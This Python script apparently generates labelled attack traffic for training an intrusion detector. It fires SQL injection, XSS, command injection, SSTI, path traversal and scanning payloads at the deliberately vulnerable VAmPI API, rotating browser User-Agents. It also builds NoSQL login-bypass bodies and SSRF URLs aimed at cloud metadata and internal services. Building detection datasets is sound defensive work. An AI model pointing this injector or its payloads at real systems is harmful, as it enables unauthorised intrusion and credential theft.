"""The `custom` injector, the second and independent tool for the content families.

Sends the hand-curated payloads in payloads.py to several injection points on VAmPI,
rotating User-Agents from the shared pool. Those payloads are disjoint from the SecLists
lists ffuf uses, and this is a different code path, so training on ffuf and testing on
custom does not leak.

Where a curated set is small, as for ssti, nosql_injection and ssrf, payloads are expanded
combinatorially from real templates to reach volume; every generated string is a valid
attack payload for its family. The family comes from the campaign manifest, and nothing
here is matched against a detection rule.
"""

import argparse
import itertools
import os
import random
import sys

import requests

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from common.manifest import now_iso, write_manifest  # noqa: E402
from common.uas import REALISTIC_UAS  # noqa: E402
from attacks import payloads as P  # noqa: E402

# real internal targets for SSRF expansion
_SSRF_HOSTS = ["127.0.0.1", "localhost", "169.254.169.254", "[::1]", "0.0.0.0",
               "172.30.0.2", "metadata.google.internal", "internal.svc.local",
               "10.0.0.1", "192.168.0.1"]
_SSRF_PORTS = ["", ":80", ":22", ":6379", ":5000", ":8080", ":3306", ":11211"]
_SSRF_SCHEMES = ["http://", "https://", "gopher://", "dict://", "file://"]

# real nosql operators for expansion
_NOSQL_OPS = ["$ne", "$gt", "$gte", "$lt", "$regex", "$in", "$nin", "$exists", "$where"]
_NOSQL_VALS = [None, "", "admin", ".*", "1==1", True]


def expand_ssrf(n: int) -> list[str]:
    out = list(P.SSRF)
    for sch, host, port in itertools.product(_SSRF_SCHEMES, _SSRF_HOSTS, _SSRF_PORTS):
        out.append(f"{sch}{host}{port}/latest/meta-data/")
        if len(out) >= n:
            break
    return out[:n]


def expand_nosql(n: int) -> list[dict]:
    out = list(P.NOSQL)
    for op, val in itertools.product(_NOSQL_OPS, _NOSQL_VALS):
        out.append({"username": {op: val}, "password": {"$ne": None}})
        out.append({"username": "admin", "password": {op: val}})
        if len(out) >= n:
            break
    return out[:n]


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--target", required=True)
    ap.add_argument("--family", required=True)
    ap.add_argument("--manifest-dir", required=True)
    ap.add_argument("--campaign-id", required=True)
    ap.add_argument("--src-ip", required=True)
    ap.add_argument("--min-rows", type=int, default=500)
    ap.add_argument("--seed", type=int, default=42)
    args = ap.parse_args()

    rng = random.Random(args.seed)
    base = args.target.rstrip("/")
    sess = requests.Session()
    start_ts = now_iso()
    sent = 0

    def send(method, path, **kw):
        nonlocal sent
        h = kw.pop("headers", {})
        h["User-Agent"] = rng.choice(REALISTIC_UAS)
        try:
            sess.request(method, base + path, headers=h, timeout=10, **kw)
            sent += 1
        except requests.RequestException:
            pass

    fam = args.family
    if fam == "scan":
        # reconnaissance: path/file enumeration + HTTP verb tampering against known paths
        import itertools as _it
        combos = list(_it.product(P.SCAN_PATHS, ["GET"] + P.SCAN_VERBS))
        for path, verb in _it.cycle(combos):
            send(verb, path)
            if sent >= args.min_rows:
                break
    elif fam == "nosql_injection":
        pset = expand_nosql(max(args.min_rows, 120))
        for body in itertools.islice(itertools.cycle(pset), args.min_rows):
            # send as JSON body to auth endpoints and as bracket-notation query
            send("POST", "/users/v1/login", json=body)
            if sent >= args.min_rows:
                break
    elif fam == "ssrf":
        pset = expand_ssrf(max(args.min_rows, 130))
        points = ["/users/v1/{p}", "/books/v1/{p}", "/users/v1?url={p}", "/users/v1?next={p}"]
        for pay in itertools.cycle(pset):
            from urllib.parse import quote
            pt = points[sent % len(points)]
            send("GET", pt.format(p=quote(pay, safe="")))
            if sent >= args.min_rows:
                break
    else:
        # string payload families: sqli, xss, path_traversal, cmd_injection, ssti
        pset = {
            "sqli": P.SQLI, "xss": P.XSS, "path_traversal": P.PATH_TRAVERSAL,
            "cmd_injection": P.CMD_INJECTION, "ssti": P.SSTI,
        }[fam]
        from urllib.parse import quote
        points = [
            lambda p: ("GET", f"/users/v1/{quote(p, safe='')}"),
            lambda p: ("GET", f"/books/v1/{quote(p, safe='')}"),
            lambda p: ("GET", f"/users/v1?q={quote(p, safe='')}"),
            lambda p: ("GET", f"/users/v1?id={quote(p, safe='')}"),
            lambda p: ("POST", "/users/v1/register"),  # payload in body below
        ]
        for pay in itertools.cycle(pset):
            fn = points[sent % len(points)]
            method, path = fn(pay)
            if method == "POST":
                send("POST", "/users/v1/register",
                     json={"username": pay, "password": pay, "email": f"{pay[:20]}@x.com"})
            else:
                send(method, path)
            if sent >= args.min_rows:
                break

    end_ts = now_iso()
    write_manifest(
        out_dir=args.manifest_dir, campaign_id=args.campaign_id, app="vampi",
        label="attack", attack_family=fam, attack_tool="custom",
        src_ip=args.src_ip, start_ts=start_ts, end_ts=end_ts,
        extra={"seed": args.seed, "rows_sent": sent, "min_rows": args.min_rows},
    )
    print(f"[custom:{fam}] sent {sent} flows, window [{start_ts},{end_ts}]", flush=True)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
